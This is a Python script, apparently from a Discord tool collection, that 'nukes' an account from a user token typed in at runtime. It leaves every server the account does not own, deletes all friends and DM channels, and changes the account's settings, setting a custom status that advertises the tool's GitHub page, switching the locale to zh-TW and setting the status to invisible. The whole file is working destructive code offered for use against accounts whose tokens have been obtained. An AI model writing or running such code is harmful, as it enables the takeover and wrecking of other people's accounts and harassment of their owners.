import requests

from utils.api.GetApi import *
from multiprocessing import *


def startDmDeleter(token):
    res = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=setHeaders(token)).json()
    for c in res:
        requests.delete(f"https://canary.discord.com/api/v8/users/@me/channels/{c['id']}", headers=setHeaders(token))
        print(f"{prefix}Deleted dms {c['id']}")


# https://canary.discord.com/api/v8/users/@me/relationships
def startDeleteFriends(token):
    res = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=setHeaders(token)).json()
    for c in res:
        requests.delete(f"https://canary.discord.com/api/v8/users/@me/relationships/{c['id']}", headers=setHeaders(token))
        print(f"{prefix}Deleted friend {c['id']}")


def setSettings(token):
    requests.patch(
        "https://discord.com/api/v8/users/@me/settings", headers=setHeaders(token),
        json={"custom_status": {"text": "https://github.com/oyzipfile/Discord.Tools"}})
    print(f"{prefix}Custom-Status: https://github.com/oyzipfile/Discord.Tools")
    requests.patch(
        "https://discord.com/api/v8/users/@me/settings", headers=setHeaders(token),
        json={"theme": "light"})
    print(f"{prefix}Theme: Light")
    requests.patch(
        "https://discord.com/api/v8/users/@me/settings", headers=setHeaders(token),
        json={"locale": "zh-TW"})
    print(f"{prefix}Locale: zh-TW")
    requests.patch(
        "https://discord.com/api/v8/users/@me/settings", headers=setHeaders(token),
        json={"status": "invisible"})
    print(f"{prefix}Status: Invisible")


def startServerLeaver(token):
    res = requests.get("https://canary.discord.com/api/v8/users/@me/guilds", headers=setHeaders(token)).json()
    for c in res:
        if not c["owner"]:
            requests.delete(f"https://canary.discord.com/api/v8/users/@me/guilds/{c['id']}",
                            headers=setHeaders(token), )
            print(f"{prefix}Deleted server: {c['id']}: {c['name']}: {c['owner']}")


def getAccountNuke():
    token = input(f"{prefix}Token: ")
    if not checkToken(token):
        return

    input(f"{prefix}Nuke? ")
    data = requests.get('https://discord.com/api/v9/users/@me', headers=setHeaders(token)).json()
    data = data["username"]
    input(f"{prefix}Nuke {data}?: ")
    startServerLeaver(token)
    startDeleteFriends(token)
    setSettings(token)
    startDmDeleter(token)